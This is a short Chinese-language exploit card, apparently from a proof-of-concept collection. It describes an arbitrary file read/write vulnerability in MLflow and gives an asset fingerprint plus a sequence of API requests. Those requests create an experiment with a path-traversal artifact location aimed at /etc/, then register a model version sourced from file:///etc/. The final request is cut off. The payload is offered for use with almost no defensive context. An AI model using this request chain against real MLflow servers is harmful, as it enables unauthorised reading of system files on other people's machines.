# Mlflowcreate任意文件读取漏洞

- **系统**：Mlflowcreate　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app="MLflow"`
- **请求**：`POST /ajax-api/2.0/mlflow/experiments/create HTTP/1.1`
- **关键头**：`Content-Type: application/json`　`Content-Length: 110`

**请求体 / payload**
```
{"name": "jMTOLYHwzZIVFDCoX", "artifact_location": "http:///#/../../../../../../../../../../../../../../etc/"}
POST /api/2.0/mlflow/runs/create HTTP/1.1
Host:
Content-Type: application/json
Content-Length: 31
"experiment_id": "34"
POST /ajax-api/2.0/mlflow/registered-models/create HTTP/1.1
Host:
Content-Type: application/json
Content-Length: 29
{"name": "jMTOLYHwzZIVFDCoX"}
POST /ajax-api/2.0/mlflow/model-versions/create HTTP/1.1
Host:
Content-Type: application/json
Content-Length: 101
{"name": "jMTOLYHwzZIVFDCoX", "run_id": "7cf272542e414ccc80549e8f917b81ca", "source": "file:///etc/"}
GET /mo…（脚本共 685 字，完整版见原文）
```
- **预期**：200　|　—